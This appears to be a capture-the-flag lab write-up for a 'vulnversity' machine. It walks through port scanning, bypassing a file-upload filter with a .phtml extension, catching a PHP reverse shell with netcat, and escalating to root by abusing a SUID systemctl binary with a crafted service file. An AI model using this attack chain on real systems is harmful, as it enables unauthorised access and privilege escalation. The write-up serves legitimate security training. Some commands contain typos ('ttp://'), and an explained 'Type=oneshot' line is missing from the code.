# vulnversity

## nmap
```
Port 21 ftp
Port 22 ssh
Port 139 Samba
Port 445 Samba
Port 3128 Squid
Port 3333 http
```
## gobuster
```
/css
/font
/images
/index.html
/internal # provides upload facility with files stored held at /internal/uploads
/js
/server-status

```
## burp suite
We tested a standard file to see if it will upload. In this example we uploaded a text.php, in case we can use a reverse shell. This failed initially, so used burpe suite to do the following:

1. Intercept and attempt to upload a file.
2. Send the intercepted request to Intruder.
3. Clear payload positions and add by selecting the 'php' extension.
4. Select a payload set as a simple list (extensions_common.txt) and upload your payload list.
5. Start your attack.
6. Now filter your results to find the extension that the site accepted.
7. Now we know that .phtml is accepted amend the exploit.py to exploit.phtml.

## reverse shell
We will use the pentestmonkey reverse shell ensuring that as well as changing the extention to .phtml, that we update the IP address and Port of the attackers machine, in preperation for the netcat command.
```
nc -lnvp 9001
````
We now upload the file directly to the _/internal/upload_ folder and run it from the browser by clicking or by using a curl command.
```
curl ttp://10.10.74.180:3333/internal/uploads/php-reverse-shell.phtml
```
This now gives us access to a reverse shell. We can create a proper interactive shell by:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
We cannot access sudo permissions so let us look at SUID bit escalation:
```
find / -perm -4000 2>/dev/null
```
Using GTFObins we can see that there are two options for systemctl as SUID and sudo

```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
* TF=$(mktemp).service: we will create a new environment variable called “TF” (the name can be anything). Next, we will be using the mktemp command to create a new temporary file as a system service file.
* echo '[Service]: use the echo command to enter an input into the system. The single quote (‘) will allow us to enter into multi-line mode so we can enter the rest of the commands.
* Type=oneshot: declare the service as oneshot, which means that the service will execute the action and then immediately exit.
* ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output": when the service starts, use the sh command to execute (-c) everything inside the double quotes. This will send the results of the command “/root/root.txt” into a file named output in the tmp directory.
* [Install]: denotes the second part of our system services file.
* WantedBy=multi-user.target' > $TF: set the service to run once it reaches a certain runlevel. Multi-user.target is runlevel 3, while a functional Linux OS with GUI is runlevel 5. This dependency input and everything before is then redirected into the TF variable. The single quote after target is to denote the end of our echo entry.
* Systemctl link $TF: link the TF variable to systemctl so it can be executed by systemctl even though it’s in a different path from other service files.
* systemctl enable --now $TF: enable the service file stored in the TF variable immediately. It will reload the system manager to ensure the changes are in effect.

Then just read the root flag file:
```
cat /tmp/output
```

We can also escalate to a bash shell with a slighyt change of command.
```
eop=$(mktemp).service
echo '[Service]

ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $eop

/bin/systemctl link $eop

/bin/systemctl enable --now $eop
```
This changes the SUID of bash to allow us to use as root. We simply:
```bash -p
```
And now we have root permissions in the shell. Again use to read the flag file.
